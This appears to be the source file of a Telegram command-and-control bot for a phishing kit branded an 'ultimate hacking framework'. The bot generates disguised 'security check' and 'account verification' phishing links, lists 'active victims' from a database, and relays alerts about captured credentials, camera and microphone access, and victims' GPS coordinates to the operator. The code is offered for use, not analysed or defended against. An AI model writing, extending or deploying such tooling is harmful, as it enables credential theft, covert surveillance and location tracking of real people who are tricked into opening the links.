hereconst TelegramBot = require('node-telegram-bot-api');

class EnhancedTelegramBot {
    constructor(token, db) {
        this.bot = new TelegramBot(token, {
            polling: true,
            request: {
                agentOptions: {
                    keepAlive: true,
                    family: 4
                }
            }
        });
        this.db = db;
        this.setupHandlers();
    }

    setupHandlers() {
        // Command handlers
        this.bot.onText(/\/start/, (msg) => this.handleStart(msg));
        this.bot.onText(/\/create (.+)/, (msg, match) => this.handleCreate(msg, match[1]));
        this.bot.onText(/\/victims/, (msg) => this.handleVictims(msg));
        this.bot.onText(/\/stats/, (msg) => this.handleStats(msg));
        this.bot.onText(/\/broadcast (.+)/, (msg, match) => this.handleBroadcast(msg, match[1]));
        this.bot.onText(/\/cleanup/, (msg) => this.handleCleanup(msg));
        
        // Inline query handler for quick link generation
        this.bot.on('inline_query', (query) => this.handleInlineQuery(query));
    }

    async handleStart(msg) {
        const welcomeMsg = `🕵️ ULTIMATE HACKING FRAMEWORK v5.0

🔥 Advanced Commands:
/create [url] - Create phishing link
/victims - List active victims
/stats - System statistics
/broadcast [msg] - Broadcast to victims
/cleanup - Clean old data

📊 Quick Actions:
• Generate phishing links
• Monitor active sessions
• Real-time data collection
• Remote victim control

⚡ Replit Optimized | Multi-Threaded`;

        await this.bot.sendMessage(msg.chat.id, welcomeMsg, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "🔄 Generate Link", callback_data: "generate_link" },
                        { text: "👥 View Victims", callback_data: "view_victims" }
                    ],
                    [
                        { text: "📊 System Stats", callback_data: "system_stats" },
                        { text: "🛡️ Security", callback_data: "security_status" }
                    ]
                ]
            }
        });
    }

    async handleCreate(msg, targetUrl) {
        try {
            const attackTypes = [
                { name: 'Security Check', value: 'security-check', emoji: '🔒' },
                { name: 'Account Verification', value: 'verification', emoji: '✅' },
                { name: 'System Update', value: 'update', emoji: '🔄' },
                { name: 'Security Awareness', value: 'awareness', emoji: '🎯' }
            ];

            const selectedAttack = attackTypes[Math.floor(Math.random() * attackTypes.length)];
            const encodedUrl = Buffer.from(targetUrl).toString('base64');
            const shortId = Math.random().toString(36).substr(2, 6);
            
            const phishingUrl = `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co/${selectedAttack.value}/${encodedUrl}?id=${shortId}`;
            
            const message = `🎣 PHISHING LINK CREATED

${selectedAttack.emoji} Attack Type: ${selectedAttack.name}
🔗 Target URL: ${targetUrl}
📊 Session ID: ${shortId}

🌐 Phishing URL:
<code>${phishingUrl}</code>

📈 Expected Data Collection:
✅ Camera & Microphone Access
✅ GPS Location Tracking  
✅ Device Fingerprinting
✅ Behavioral Analytics
✅ System Information
✅ Network Configuration

⚡ Send this link to your target`;

            await this.bot.sendMessage(msg.chat.id, message, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "📋 Copy Link", callback_data: `copy_${phishingUrl}` },
                            { text: "🔄 New Link", callback_data: "new_link" }
                        ]
                    ]
                }
            });

        } catch (error) {
            await this.bot.sendMessage(msg.chat.id, `❌ Error creating link: ${error.message}`);
        }
    }

    async handleVictims(msg) {
        try {
            const victims = await this.getActiveVictims();
            
            if (victims.length === 0) {
                await this.bot.sendMessage(msg.chat.id, "📭 No active victims found");
                return;
            }

            let message = `👥 ACTIVE VICTIMS (${victims.length})\n\n`;
            
            victims.slice(0, 10).forEach((victim, index) => {
                const timeAgo = this.getTimeAgo(new Date(victim.last_activity));
                message += `${index + 1}. <b>${victim.id}</b>\n`;
                message += `   🌐 ${victim.browser} on ${victim.platform}\n`;
                message += `   📍 ${victim.country} | 🕒 ${timeAgo}\n`;
                message += `   📊 Data: ${victim.data_collected} items\n\n`;
            });

            if (victims.length > 10) {
                message += `... and ${victims.length - 10} more victims`;
            }

            await this.bot.sendMessage(msg.chat.id, message, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "🔄 Refresh", callback_data: "refresh_victims" },
                            { text: "📊 Detailed View", callback_data: "detailed_victims" }
                        ]
                    ]
                }
            });

        } catch (error) {
            await this.bot.sendMessage(msg.chat.id, `❌ Error fetching victims: ${error.message}`);
        }
    }

    async sendVictimAlert(victimId, dataType, data) {
        const alerts = {
            'location': '📍 New Location Data',
            'media_access': '🎥 Media Access Granted',
            'credentials': '🔑 Credentials Captured',
            'scan_complete': '✅ Scan Completed',
            'error': '❌ Error Occurred'
        };

        const alertText = alerts[dataType] || '📊 New Data Collected';
        
        let message = `${alertText}\n\n`;
        message += `👤 Victim: <code>${victimId}</code>\n`;
        message += `📊 Data Type: ${dataType}\n`;
        message += `🕒 Time: ${new Date().toLocaleTimeString()}\n`;

        // Add relevant data preview
        if (dataType === 'location' && data.coordinates) {
            message += `\n📍 Coordinates:\n`;
            message += `Lat: ${data.coordinates.latitude}\n`;
            message += `Lng: ${data.coordinates.longitude}\n`;
            message += `Accuracy: ${data.coordinates.accuracy}m`;
        }

        await this.bot.sendMessage(this.config.adminChatId, message, {
            parse_mode: 'HTML'
        });
    }

    getTimeAgo(date) {
        const seconds = Math.floor((new Date() - date) / 1000);
        
        const intervals = {
            year: 31536000,
            month: 2592000,
            day: 86400,
            hour: 3600,
            minute: 60
        };

        for (const [unit, secondsInUnit] of Object.entries(intervals)) {
            const interval = Math.floor(seconds / secondsInUnit);
            if (interval >= 1) {
                return `${interval} ${unit}${interval === 1 ? '' : 's'} ago`;
            }
        }
        
        return 'just now';
    }

    async getActiveVictims() {
        return new Promise((resolve, reject) => {
            this.db.all(
                "SELECT * FROM victims WHERE status = 'active' ORDER BY last_activity DESC LIMIT 50",
                (err, rows) => {
                    if (err) reject(err);
                    else resolve(rows);
                }
            );
        });
    }
}

module.exports = EnhancedTelegramBot;
